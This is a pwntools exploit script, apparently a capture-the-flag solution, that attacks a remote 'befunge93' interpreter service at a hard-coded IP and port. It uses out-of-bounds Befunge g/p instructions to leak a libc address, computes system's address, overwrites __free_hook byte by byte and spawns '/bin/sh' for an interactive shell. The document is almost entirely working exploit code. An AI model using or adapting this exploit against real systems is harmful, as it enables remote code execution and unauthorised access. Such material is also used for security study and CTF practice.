from pwn import *
# p = process("./befunge93")
p = remote("94.74.89.68",10101)



p.sendlineafter("input x:",str(0x400))
p.sendlineafter("input y:",str(0x800))

# &-> push int
# g-> oob read
# p-> oob write
# +,- add and sub


code = '/bin/sh\x00&&g&&g&&g&&g&&g&&g,,,,,,&&&p&&&p&&&p&&&p&&&p&&&p>@'
p.sendlineafter("code length:",str(len(code)))

offset = 0x742780
free_hook_offset = 0x743e38


p.sendafter("your code:",code)

p.recvuntil(">@")

for i in range(5,-1,-1):
    p.sendline(str(-0x100000))
    sleep(0.3)
    p.sendline(str(-0x80000000+offset+i))
    sleep(0.3)

# gdb.attach(p,"")
# gdb.attach(p,"brva 0x1fc3")


leak_value = u64(p.recv(6).ljust(8,b'\x00'))
info("leak: " + hex(leak_value))

system = leak_value - 0x19a6f0


# pause()

for i in range(6):
    p.sendline(str(system & 0xff))      # value
    sleep(0.3)
    p.sendline(str(-0x100000))      # x
    sleep(0.3)
    p.sendline(str(-0x80000000+free_hook_offset+i))  # y
    sleep(0.3)
    system = system >> 8

# p.sendafter("your code:",'A')

p.interactive()
